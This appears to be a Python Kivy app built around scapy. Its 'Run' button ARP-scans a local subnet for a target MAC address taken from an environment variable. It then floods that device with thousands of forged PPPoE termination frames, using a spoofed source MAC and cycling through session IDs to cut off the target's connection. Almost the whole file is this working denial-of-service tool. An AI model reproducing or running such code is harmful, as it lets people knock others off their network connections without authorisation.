# -*- coding: utf-8 -*-

from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.popup import Popup
from math import *
from scapy.all import *

ipscan='10.0.2.1/24'
src = os.environ["SRC"]
dst = os.environ["DST"]

def st(mac):
    for i in range(6553):
        c = Ether() / PPPoE()
        c.dst = mac
        c.src = src
        c.type = 0x8863
        c.payload.code = 0xa7
        c.payload.sessionid = i
        c.payload.len = 0
        sendp(c,iface='Realtek PCIe GbE Family Controller', verbose=0)

def message(self):
    pop = Popup(text=self.text)

class TextInputApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', spacing=15, padding=10)
        self.text=TextInput(font_size=50) # font_size输入文本框大小
        self.out_text=TextInput(font_size=50)
        button = Button(text="Run", size_hint=(0.5, 0.5),
                        pos_hint={"center_x":0.5, "center_y":0.5})
        button.bind(on_press=self.press)
        layout.add_widget(self.text)
        layout.add_widget(self.out_text)
        layout.add_widget(button)
        return layout
    def press(self, instance):
        # pop = Popup(text=self.text.text)
        try: # 捕获异常，避免程序中断
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ipscan), timeout=2, verbose=False)
            self.text.text = 'Running'
        except:
            self.out_text.text="wrong" # 如果是不合法信息，输出错误
            pass
        else:
            for snd, rcv in ans:
                print(rcv.show())
                if rcv[ARP].hwsrc == dst:
                    st(rcv[ARP].hwsrc)
                    self.out_text.text = "Done!"
                else:
                    pass

if __name__=="__main__":
    TextInputApp().run()
